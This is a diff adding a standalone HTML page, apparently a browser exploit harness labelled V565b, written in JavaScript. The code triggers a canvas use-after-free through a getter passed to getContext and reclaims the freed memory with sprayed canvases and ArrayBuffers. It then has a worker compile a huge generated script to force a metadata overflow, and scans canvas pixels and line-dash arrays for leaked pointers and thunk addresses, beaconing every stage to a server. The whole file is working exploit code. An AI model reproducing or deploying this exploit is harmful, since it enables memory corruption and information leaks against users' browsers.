@@ -1,0 +1,323 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>V565b</title></head>
+<body style="background:#111;color:#0f0;font:13px monospace;padding:10px">
+<pre id="log"></pre>
+<script>
+var L=document.getElementById('log');
+function log(m){L.textContent+=m+'\n'}
+function beacon(tag,data){
+  log('[B] '+tag+': '+data);
+  try{
+    var x=new XMLHttpRequest();
+    x.open('GET','/beacon/V565b-'+tag+'?d='+encodeURIComponent(String(data).substring(0,400))+'&t='+Date.now(),false);
+    x.send();
+  }catch(e){}
+}
+
+window.onerror=function(m,s,l,c){
+  beacon('ONERROR',m+'|'+s+':'+l+':'+c);
+};
+
+function heapWarmup768(){
+  var warmup=[];
+  for(var i=0;i<100;i++){
+    var c=document.createElement('canvas');c.width=1;c.height=1;
+    warmup.push(c.getContext('2d'));
+  }
+  warmup=null;
+  var fresh=[];
+  for(var i=0;i<50;i++){
+    var c=document.createElement('canvas');c.width=1;c.height=1;
+    fresh.push(c.getContext('2d'));
+  }
+  return fresh;
+}
+
+function triggerUAF(){
+  var outer=document.createElement('canvas');
+  outer.width=1;outer.height=1;
+  var innerCtx=null;
+  var dict={};
+  Object.defineProperty(dict,'alpha',{
+    get:function(){
+      innerCtx=outer.getContext('2d');
+      return true;
+    }
+  });
+  outer.getContext('bitmaprenderer',dict);
+  return {ctx:innerCtx,canvas:outer};
+}
+
+function massReclaim(w,h){
+  if(!w)w=10;if(!h)h=10;
+  var contexts=[];var canvases=[];
+  for(var i=0;i<200;i++){
+    var c=document.createElement('canvas');c.width=w;c.height=h;
+    var ctx=c.getContext('2d');
+    ctx.lineWidth=200+i;
+    contexts.push(ctx);canvases.push(c);
+  }
+  return {contexts:contexts,canvases:canvases};
+}
+
+function lightGC(){
+  for(var g=0;g<5;g++){
+    var j=[];for(var i=0;i<2000;i++)j.push({x:i});
+    j=null;
+  }
+}
+
+// =============================================
+// PHASE 0: Boot + heap warmup + alias setup
+// =============================================
+beacon('BOOT','V565b-worker-meta');
+
+var warmupCtxs=heapWarmup768();
+beacon('WARMUP','kept='+warmupCtxs.length);
+
+var u=triggerUAF();
+var r=massReclaim(10,10);
+var lw=u.ctx.lineWidth;
+var idx=Math.round(lw-200);
+beacon('SETUP','aliasIdx='+idx+'|lw='+lw);
+
+if(idx<0||idx>=200||lw<200||lw>=400){
+  beacon('FAIL','alias-failed|idx='+idx+'|lw='+lw);
+  setTimeout(function(){location.reload()},3000);
+  throw new Error('STOP');
+}
+
+u.ctx=null;u=null;
+lightGC();
+
+var aliasCtx=r.contexts[idx];
+var aliasCvs=r.canvases[idx];
+beacon('GC','survived|lw='+aliasCtx.lineWidth);
+
+// =============================================
+// T1: Canvas backing store zero-check (baseline)
+// =============================================
+(function(){
+  try{
+    var tc=document.createElement('canvas');
+    tc.width=1;tc.height=25028;
+    var tctx=tc.getContext('2d');
+    var px=tctx.getImageData(0,0,1,25028);
+    var nz=0,first=-1;
+    for(var i=0;i<px.data.length;i++){
+      if(px.data[i]!==0){nz++;if(first<0)first=i;}
+    }
+    beacon('T1','backing-zero|bytes='+px.data.length+'|nz='+nz+'|first='+first);
+    tc=null;tctx=null;px=null;
+  }catch(e){beacon('T1','ERR:'+e.message)}
+})();
+
+// =============================================
+// T2: Bait-and-switch spray
+// =============================================
+var baits=[];
+var targets=[];
+var targetCtxs=[];
+
+for(var i=0;i<60;i++) baits.push(new ArrayBuffer(100112));
+beacon('T2A','baits='+baits.length);
+
+for(var i=0;i<30;i++){
+  var tc=document.createElement('canvas');
+  tc.width=1;tc.height=25028;
+  var tctx=tc.getContext('2d');
+  tctx.getImageData(0,0,1,1);
+  targets.push(tc);
+  targetCtxs.push(tctx);
+}
+beacon('T2B','targets='+targets.length);
+
+var dashArr=[];
+for(var i=0;i<900;i++) dashArr.push(1+i*0.001);
+aliasCtx.setLineDash(dashArr);
+beacon('T2C','lineDash='+aliasCtx.getLineDash().length);
+
+for(var i=0;i<baits.length;i++) baits[i]=null;
+baits=null;
+lightGC();
+beacon('T2D','baits-freed');
+
+// =============================================
+// T3: MetadataTable overflow via WORKER
+// Worker compiles in same process → sweep hits main-thread heap
+// Main thread stays responsive for beacons
+// =============================================
+(function(){
+  try{
+    var N=38348816;
+    var t0=Date.now();
+    beacon('T3A','worker-compile|N='+N);
+
+    // Worker source: build the 38M op_call IIFE inside the worker
+    // Worker builds the source, creates a Blob, and evals via importScripts
+    var workerSrc=[
+      'var t0=Date.now();',
+      'var N='+N+';',
+      'var CPCH=10000;',
+      'var chunk="f();".repeat(CPCH);',
+      'var parts=["(function(){function f(){}if(0){"];',
+      'var full=Math.floor(N/CPCH);',
+      'for(var i=0;i<full;i++) parts.push(chunk);',
+      'var rem=N%CPCH;',
+      'if(rem>0) parts.push("f();".repeat(rem));',
+      'parts.push("}})();");',
+      'postMessage("SOURCE-READY|parts="+parts.length+"|ms="+(Date.now()-t0));',
+      'var blob=new Blob(parts,{type:"application/javascript"});',
+      'parts=null;chunk=null;',
+      'var url=URL.createObjectURL(blob);',
+      'try{',
+      '  importScripts(url);',
+      '  URL.revokeObjectURL(url);',
+      '  blob=null;',
+      '  postMessage("COMPILED-OK|ms="+(Date.now()-t0));',
+      '}catch(e){',
+      '  postMessage("COMPILE-ERR|"+e.message+"|ms="+(Date.now()-t0));',
+      '}'
+    ].join('\n');
+
+    var wBlob=new Blob([workerSrc],{type:'application/javascript'});
+    var wUrl=URL.createObjectURL(wBlob);
+    var w=new Worker(wUrl);
+
+    w.onmessage=function(e){
+      var msg=String(e.data);
+      beacon('T3W',msg);
+      if(msg.indexOf('COMPILED-OK')===0||msg.indexOf('COMPILE-ERR')===0){
+        w.terminate();
+        URL.revokeObjectURL(wUrl);
+        beacon('T3C','done|ms='+(Date.now()-t0));
+        // Give heap a moment to settle after 4.3GB sweep
+        setTimeout(runScan,100);
+      }
+    };
+
+    w.onerror=function(e){
+      beacon('T3E','worker-error|'+e.message);
+      w.terminate();
+      URL.revokeObjectURL(wUrl);
+      setTimeout(runScan,100);
+    };
+
+    // Heartbeat: check worker is alive every 30s
+    var hbCount=0;
+    var hbTimer=setInterval(function(){
+      hbCount++;
+      beacon('T3H','heartbeat-'+hbCount+'|ms='+(Date.now()-t0));
+      if(hbCount>=20){
+        clearInterval(hbTimer);
+        beacon('T3H','timeout|ms='+(Date.now()-t0));
+        w.terminate();
+        runScan();
+      }
+    },30000);
+
+    w.onmessage_orig=w.onmessage;
+    w.onmessage=function(e){
+      clearInterval(hbTimer);
+      w.onmessage_orig(e);
+    };
+
+  }catch(e){
+    beacon('T3','ERR:'+e.message);
+    runScan();
+  }
+})();
+
+// =============================================
+// T4-T7: Scan for thunk addresses after sweep
+// =============================================
+function runScan(){
+  var totalHits=0;
+  var thunkMap={};
+
+  for(var t=0;t<targets.length;t++){
+    try{
+      var px=targetCtxs[t].getImageData(0,0,1,25028);
+      var d=px.data;
+      var hits=0,ffHits=0;
+      var samples=[];
+
+      var maxStride=Math.floor(d.length/112);
+      for(var s=0;s<maxStride;s++){
+        var base=s*112;
+
+        if(d[base+12]===0xff&&d[base+13]===0xff&&d[base+14]===0xff&&d[base+15]===0xff) ffHits++;
+
+        var off=base+24;
+        if(off+7>=d.length) break;
+        var hex='';
+        var nz=false;
+        for(var j=7;j>=0;j--){
+          var bv=d[off+j];
+          if(bv) nz=true;
+          hex+=('0'+bv.toString(16)).slice(-2);
+        }
+        if(nz){
+          hits++;
+          if(!thunkMap[hex]) thunkMap[hex]=0;
+          thunkMap[hex]++;
+          if(samples.length<3) samples.push(hex);
+        }
+      }
+
+      totalHits+=hits;
+      if(hits>0||ffHits>0||t<3){
+        beacon('T4-'+t,'thunk='+hits+'|ff='+ffHits+'|s='+samples.join(','));
+      }
+    }catch(e){beacon('T4-'+t,'ERR:'+e.message)}
+  }
+
+  var bestThunk='',bestCount=0;
+  for(var k in thunkMap){
+    if(thunkMap[k]>bestCount){bestCount=thunkMap[k];bestThunk=k;}
+  }
+  beacon('T4','TOTAL|hits='+totalHits+'|best='+bestThunk+'|bestN='+bestCount+'|targets='+targets.length);
+
+  // T5: lineDash scan
+  try{
+    var ld=aliasCtx.getLineDash();
+    var ptrHits=0;
+    var dashSamples=[];
+    for(var i=0;i<ld.length;i++){
+      if(ld[i]>1000000||ld[i]<-1000000||ld[i]!==ld[i]){
+        ptrHits++;
+        if(dashSamples.length<5){
+          var dv=new DataView(new ArrayBuffer(8));
+          dv.setFloat64(0,ld[i]);
+          var hex='';
+          for(var j=0;j<8;j++) hex+=('0'+dv.getUint8(j).toString(16)).slice(-2);
+          dashSamples.push('i'+i+'='+hex);
+        }
+      }
+    }
+    beacon('T5','lineDash|len='+ld.length+'|ptrHits='+ptrHits+'|s='+dashSamples.join(','));
+  }catch(e){beacon('T5','ERR:'+e.message)}
+
+  // T6: Full non-zero scan on first 3 targets
+  for(var t=0;t<Math.min(3,targets.length);t++){
+    try{
+      var px=targetCtxs[t].getImageData(0,0,1,25028);
+      var nz=0,first=-1;
+      for(var i=0;i<px.data.length;i++){
+        if(px.data[i]!==0){nz++;if(first<0)first=i;}
+      }
+      beacon('T6-'+t,'fullscan|nz='+nz+'|first='+first);
+    }catch(e){beacon('T6-'+t,'ERR:'+e.message)}
+  }
+
+  // T7: Alias health
+  try{
+    aliasCtx.lineWidth=77.77;
+    var rb=aliasCtx.lineWidth;
+    beacon('T7','alias|set=77.77|got='+rb+'|ok='+(rb===77.77));
+  }catch(e){beacon('T7','ERR:'+e.message)}
+
+  beacon('DONE','V565b-complete');
+}
+</script>
+</body></html>
